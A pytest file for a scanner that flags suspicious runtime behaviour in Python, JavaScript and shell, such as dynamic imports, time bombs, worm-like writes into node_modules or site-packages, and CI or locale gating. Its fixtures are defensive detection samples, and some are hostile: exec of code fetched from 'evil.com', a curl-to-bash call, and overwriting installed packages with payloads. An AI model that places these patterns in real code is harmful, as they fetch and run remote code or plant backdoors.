"""Tests for scan_runtime_dynamism.py - Runtime Behavior Prediction Scanner.

NOTE: Patterns owned by other scanners are tested in their own test files:
- types.FunctionType, types.CodeType, marshal.loads, sys.addaudithook,
  bytes([]).decode(), open(__file__,'w') -> test_scan_ast.py
- Runtime pip/npm install -> test_scan_manifest_drift.py
- Dynamic tool descriptions -> test_scan_mcp_security.py
"""

import os
import json
import pytest
import scan_runtime_dynamism as scanner


class TestDynamicImports:
    def test_importlib_import_module_variable(self, tmp_path):
        f = tmp_path / "loader.py"
        f.write_text(
            "import importlib\n"
            "mod_name = config.get('module')\n"
            "mod = importlib.import_module(mod_name)\n"
        )
        findings = scanner.scan_file(str(f), "loader.py")
        cats = [f.category for f in findings]
        assert "dynamic-import" in cats

    def test_importlib_literal_ok(self, tmp_path):
        """importlib.import_module with string literal should not trigger AST pattern."""
        f = tmp_path / "safe.py"
        f.write_text(
            "import importlib\n"
            "mod = importlib.import_module('json')\n"
        )
        findings = scanner.scan_file(str(f), "safe.py")
        ast_findings = [f for f in findings if "variable" in f.title.lower()]
        assert len(ast_findings) == 0

    def test_dunder_import_variable(self, tmp_path):
        f = tmp_path / "evil.py"
        f.write_text("mod = __import__(user_input)\n")
        findings = scanner.scan_file(str(f), "evil.py")
        cats = [f.category for f in findings]
        assert "dynamic-import" in cats

    def test_dunder_import_string_literal(self, tmp_path):
        f = tmp_path / "evil.py"
        f.write_text("mod = __import__('evil_backdoor')\n")
        findings = scanner.scan_file(str(f), "evil.py")
        cats = [f.category for f in findings]
        assert "dynamic-import" in cats

    def test_js_require_variable(self, tmp_path):
        f = tmp_path / "loader.js"
        f.write_text("const mod = require(pluginName)\n")
        findings = scanner.scan_file(str(f), "loader.js")
        assert any("dynamic-import" in f.category for f in findings)

    def test_js_dynamic_import_variable(self, tmp_path):
        f = tmp_path / "loader.mjs"
        f.write_text("const mod = await import(modulePath)\n")
        findings = scanner.scan_file(str(f), "loader.mjs")
        assert any("dynamic-import" in f.category for f in findings)


class TestFetchExecute:
    def test_eval_requests_get(self, tmp_path):
        f = tmp_path / "evil.py"
        f.write_text("exec(requests.get('http://evil.com/payload.py').text)\n")
        findings = scanner.scan_file(str(f), "evil.py")
        cats = [f.category for f in findings]
        assert "fetch-execute" in cats

    def test_download_to_variable(self, tmp_path):
        """HTTP response stored in variable should be flagged."""
        f = tmp_path / "evil.py"
        f.write_text("response = requests.get('http://evil.com/stage2.py')\n")
        findings = scanner.scan_file(str(f), "evil.py")
        cats = [f.category for f in findings]
        assert "fetch-execute" in cats

    def test_curl_pipe_bash(self, tmp_path):
        f = tmp_path / "install.py"
        f.write_text("subprocess.run(['curl', 'http://evil.com/setup.sh', '|', 'bash'])\n")
        findings = scanner.scan_file(str(f), "install.py")
        assert isinstance(findings, list)


class TestSelfModification:
    """Only tests patterns unique to runtime_dynamism (not in scan_ast.py)."""

    def test_sourceless_file_loader(self, tmp_path):
        f = tmp_path / "evil.py"
        f.write_text("from importlib._bootstrap_external import SourcelessFileLoader\n")
        findings = scanner.scan_file(str(f), "evil.py")
        assert any("self-modification" in f.category for f in findings)

    def test_compile_with_variable(self, tmp_path):
        f = tmp_path / "evil.py"
        f.write_text("code = compile(user_code, '<string>', 'exec')\n")
        findings = scanner.scan_file(str(f), "evil.py")
        assert any("self-modification" in f.category for f in findings)

    def test_js_new_function_variable(self, tmp_path):
        f = tmp_path / "evil.js"
        f.write_text("const fn = new Function(userCode)\n")
        findings = scanner.scan_file(str(f), "evil.js")
        assert any("self-modification" in f.category for f in findings)

    def test_js_eval_atob(self, tmp_path):
        f = tmp_path / "evil.js"
        f.write_text("eval(atob('YWxlcnQoMSk='))\n")
        findings = scanner.scan_file(str(f), "evil.js")
        assert any("self-modification" in f.category for f in findings)


class TestTimeBombs:
    def test_datetime_comparison(self, tmp_path):
        f = tmp_path / "evil.py"
        f.write_text(
            "from datetime import datetime\n"
            "if datetime.now() > datetime(2026, 6, 1):\n"
            "    activate_payload()\n"
        )
        findings = scanner.scan_file(str(f), "evil.py")
        cats = [f.category for f in findings]
        assert "time-bomb" in cats

    def test_unix_timestamp(self, tmp_path):
        f = tmp_path / "evil.py"
        f.write_text(
            "import time\n"
            "if time.time() > 1750000000:\n"
            "    activate()\n"
        )
        findings = scanner.scan_file(str(f), "evil.py")
        cats = [f.category for f in findings]
        assert "time-bomb" in cats

    def test_js_date_now(self, tmp_path):
        f = tmp_path / "evil.js"
        f.write_text("if (Date.now() > 1750000000000) { activate(); }\n")
        findings = scanner.scan_file(str(f), "evil.js")
        cats = [f.category for f in findings]
        assert "time-bomb" in cats

    def test_counter_activation(self, tmp_path):
        f = tmp_path / "evil.py"
        f.write_text("if counter >= 100:\n    exec(payload)\n")
        findings = scanner.scan_file(str(f), "evil.py")
        cats = [f.category for f in findings]
        assert "time-bomb" in cats

    def test_time_time_variable(self, tmp_path):
        f = tmp_path / "evil.py"
        f.write_text("import time\nif time.time() > activation:\n    run()\n")
        findings = scanner.scan_file(str(f), "evil.py")
        cats = [f.category for f in findings]
        assert "time-bomb" in cats


class TestCleanCode:
    def test_clean_python(self, tmp_path):
        f = tmp_path / "clean.py"
        f.write_text(
            "import json\nimport os\n\n"
            "def process(data):\n    return json.dumps(data)\n"
        )
        findings = scanner.scan_file(str(f), "clean.py")
        assert len(findings) == 0

    def test_clean_js(self, tmp_path):
        f = tmp_path / "clean.js"
        f.write_text(
            "const fs = require('fs');\n"
            "const data = fs.readFileSync('data.json');\n"
            "console.log(JSON.parse(data));\n"
        )
        findings = scanner.scan_file(str(f), "clean.js")
        assert len(findings) == 0

    def test_non_target_file(self, tmp_path):
        f = tmp_path / "readme.md"
        f.write_text("# Hello\nThis is safe.\n")
        findings = scanner.scan_file(str(f), "readme.md")
        assert len(findings) == 0


class TestImportlibReload:
    def test_importlib_reload(self, tmp_path):
        f = tmp_path / "evil.py"
        f.write_text(
            "import importlib\nimport my_module\n"
            "importlib.reload(my_module)\n"
        )
        findings = scanner.scan_file(str(f), "evil.py")
        assert any("reload" in f.title.lower() for f in findings)


class TestSelfPropagatingWorm:
    """Tests for Category 6: Self-propagating worm detection (Item 4)."""

    def test_fs_write_to_node_modules(self, tmp_path):
        """fs.writeFileSync targeting node_modules should flag as critical."""
        f = tmp_path / "worm.js"
        f.write_text(
            "const fs = require('fs');\n"
            "fs.writeFileSync('./node_modules/lodash/index.js', payload);\n"
        )
        findings = scanner.scan_file(str(f), "worm.js")
        worm = [fi for fi in findings if fi.category == "worm-propagation"]
        assert len(worm) > 0
        assert all(fi.severity == "critical" for fi in worm)

    def test_fs_write_to_site_packages(self, tmp_path):
        """fs.writeFile targeting site-packages should flag."""
        f = tmp_path / "worm.js"
        f.write_text(
            "const fs = require('fs');\n"
            "fs.writeFile('/usr/lib/python3/site-packages/requests/__init__.py', code, cb);\n"
        )
        findings = scanner.scan_file(str(f), "worm.js")
        worm = [fi for fi in findings if fi.category == "worm-propagation"]
        assert len(worm) > 0

    def test_python_open_write_node_modules(self, tmp_path):
        """Python open() writing to node_modules should flag."""
        f = tmp_path / "worm.py"
        f.write_text(
            "with open('node_modules/express/index.js', 'w') as fh:\n"
            "    fh.write(payload)\n"
        )
        findings = scanner.scan_file(str(f), "worm.py")
        worm = [fi for fi in findings if fi.category == "worm-propagation"]
        assert len(worm) > 0

    def test_python_open_write_site_packages(self, tmp_path):
        """Python open() writing to site-packages should flag."""
        f = tmp_path / "worm.py"
        f.write_text(
            "f = open('/usr/lib/python3.11/site-packages/pip/__init__.py', 'w')\n"
            "f.write(malicious_code)\n"
        )
        findings = scanner.scan_file(str(f), "worm.py")
        worm = [fi for fi in findings if fi.category == "worm-propagation"]
        assert len(worm) > 0

    def test_shutil_copy_to_node_modules(self, tmp_path):
        """shutil.copy targeting node_modules should flag."""
        f = tmp_path / "worm.py"
        f.write_text(
            "import shutil\n"
            "shutil.copy('payload.py', 'node_modules/axios/dist/index.js')\n"
        )
        findings = scanner.scan_file(str(f), "worm.py")
        worm = [fi for fi in findings if fi.category == "worm-propagation"]
        assert len(worm) > 0

    def test_os_rename_in_site_packages(self, tmp_path):
        """os.rename targeting site-packages should flag."""
        f = tmp_path / "worm.py"
        f.write_text(
            "import os\n"
            "os.rename('backdoor.py', '/usr/lib/site-packages/requests/api.py')\n"
        )
        findings = scanner.scan_file(str(f), "worm.py")
        worm = [fi for fi in findings if fi.category == "worm-propagation"]
        assert len(worm) > 0

    def test_clean_fs_write_not_flagged(self, tmp_path):
        """Normal fs.writeFileSync to non-node_modules path should not flag."""
        f = tmp_path / "safe.js"
        f.write_text(
            "const fs = require('fs');\n"
            "fs.writeFileSync('./output/report.json', data);\n"
        )
        findings = scanner.scan_file(str(f), "safe.js")
        worm = [fi for fi in findings if fi.category == "worm-propagation"]
        assert len(worm) == 0


class TestCounterProbabilisticActivation:
    """Tests for Category 7: Counter/probabilistic activation (Item 6)."""

    def test_math_random_threshold(self, tmp_path):
        """Math.random() < threshold should flag."""
        f = tmp_path / "sneaky.js"
        f.write_text("if (Math.random() < 0.01) { require('./payload'); }\n")
        findings = scanner.scan_file(str(f), "sneaky.js")
        cats = [fi.category for fi in findings]
        assert "probabilistic-activation" in cats

    def test_python_random_threshold(self, tmp_path):
        """random.random() < threshold should flag."""
        f = tmp_path / "sneaky.py"
        f.write_text(
            "import random\n"
            "if random.random() < 0.001:\n"
            "    activate()\n"
        )
        findings = scanner.scan_file(str(f), "sneaky.py")
        cats = [fi.category for fi in findings]
        assert "probabilistic-activation" in cats

    def test_process_env_ci_conditional(self, tmp_path):
        """process.env.CI conditional should flag as environment-detection."""
        f = tmp_path / "sneaky.js"
        f.write_text("if (process.env.CI && true) { runDifferentCode(); }\n")
        findings = scanner.scan_file(str(f), "sneaky.js")
        cats = [fi.category for fi in findings]
        assert "environment-detection" in cats

    def test_process_env_github_actions(self, tmp_path):
        """process.env.GITHUB_ACTIONS conditional should flag."""
        f = tmp_path / "ci_aware.js"
        f.write_text("if (process.env.GITHUB_ACTIONS && true) { exfil(); }\n")
        findings = scanner.scan_file(str(f), "ci_aware.js")
        cats = [fi.category for fi in findings]
        assert "environment-detection" in cats

    def test_python_os_environ_ci(self, tmp_path):
        """os.environ.get('CI') should flag."""
        f = tmp_path / "ci_check.py"
        f.write_text(
            "import os\n"
            "if os.environ.get('CI'):\n"
            "    do_something_different()\n"
        )
        findings = scanner.scan_file(str(f), "ci_check.py")
        cats = [fi.category for fi in findings]
        assert "environment-detection" in cats

    def test_python_os_getenv_github_actions(self, tmp_path):
        """os.getenv('GITHUB_ACTIONS') should flag."""
        f = tmp_path / "ci_check.py"
        f.write_text(
            "import os\n"
            "running_in_ci = os.getenv('GITHUB_ACTIONS')\n"
        )
        findings = scanner.scan_file(str(f), "ci_check.py")
        cats = [fi.category for fi in findings]
        assert "environment-detection" in cats

    def test_environment_detection_is_medium(self, tmp_path):
        """Environment detection severity should be MEDIUM."""
        f = tmp_path / "ci.py"
        f.write_text("x = os.environ.get('CI')\n")
        findings = scanner.scan_file(str(f), "ci.py")
        env = [fi for fi in findings if fi.category == "environment-detection"]
        assert all(fi.severity == "medium" for fi in env)

    def test_clean_code_not_flagged(self, tmp_path):
        """Normal code without these patterns should be clean."""
        f = tmp_path / "safe.py"
        f.write_text(
            "import os\n"
            "import random\n"
            "x = random.randint(1, 100)\n"
            "print(os.environ.get('HOME'))\n"
        )
        findings = scanner.scan_file(str(f), "safe.py")
        prob = [fi for fi in findings if fi.category in ("probabilistic-activation", "environment-detection")]
        assert len(prob) == 0


class TestLocaleGating:
    """Tests for Category 8: Locale/geofence gating (mistralai v2.4.6 pattern)."""

    def test_python_locale_getdefaultlocale(self, tmp_path):
        f = tmp_path / "geo.py"
        f.write_text("lang, _ = locale.getdefaultlocale()\n")
        findings = scanner.scan_file(str(f), "geo.py")
        cats = [fi.category for fi in findings]
        assert "locale-gating" in cats

    def test_python_os_environ_lang(self, tmp_path):
        f = tmp_path / "geo.py"
        f.write_text("lang = os.environ['LANG']\n")
        findings = scanner.scan_file(str(f), "geo.py")
        cats = [fi.category for fi in findings]
        assert "locale-gating" in cats

    def test_python_os_getenv_lc_all(self, tmp_path):
        f = tmp_path / "geo.py"
        f.write_text("lc = os.getenv('LC_ALL')\n")
        findings = scanner.scan_file(str(f), "geo.py")
        cats = [fi.category for fi in findings]
        assert "locale-gating" in cats

    def test_js_navigator_language(self, tmp_path):
        f = tmp_path / "geo.js"
        f.write_text("const lang = navigator.language;\n")
        findings = scanner.scan_file(str(f), "geo.js")
        cats = [fi.category for fi in findings]
        assert "locale-gating" in cats

    def test_shell_lang_variable(self, tmp_path):
        f = tmp_path / "geo.sh"
        f.write_text('if [ "$LANG" = "ru_RU" ]; then\n  do_something\nfi\n')
        findings = scanner.scan_file(str(f), "geo.sh")
        cats = [fi.category for fi in findings]
        assert "locale-gating" in cats

    def test_geoip_lookup(self, tmp_path):
        f = tmp_path / "geo.py"
        f.write_text("import geoip\nresult = geoip.lookup(ip)\n")
        findings = scanner.scan_file(str(f), "geo.py")
        cats = [fi.category for fi in findings]
        assert "locale-gating" in cats

    def test_locale_gating_is_medium_severity(self, tmp_path):
        f = tmp_path / "geo.py"
        f.write_text("lang, _ = locale.getdefaultlocale()\n")
        findings = scanner.scan_file(str(f), "geo.py")
        locale_findings = [fi for fi in findings if fi.category == "locale-gating"]
        assert all(fi.severity == "medium" for fi in locale_findings)

    def test_i18n_without_destruction_no_correlation(self, tmp_path):
        """Locale check alone (i18n) should be medium, not critical."""
        f = tmp_path / "i18n.py"
        f.write_text(
            "import locale\n"
            "lang = locale.getdefaultlocale()\n"
            "print(f'Language: {lang}')\n"
        )
        findings = scanner.scan_file(str(f), "i18n.py")
        locale_findings = [fi for fi in findings if fi.category == "locale-gating"]
        assert len(locale_findings) > 0
        assert all(fi.severity == "medium" for fi in locale_findings)

    def test_clean_code_no_locale_flag(self, tmp_path):
        """Normal code without locale patterns stays clean."""
        f = tmp_path / "safe.py"
        f.write_text("import os\nprint(os.environ.get('HOME'))\n")
        findings = scanner.scan_file(str(f), "safe.py")
        locale_findings = [fi for fi in findings if fi.category == "locale-gating"]
        assert len(locale_findings) == 0
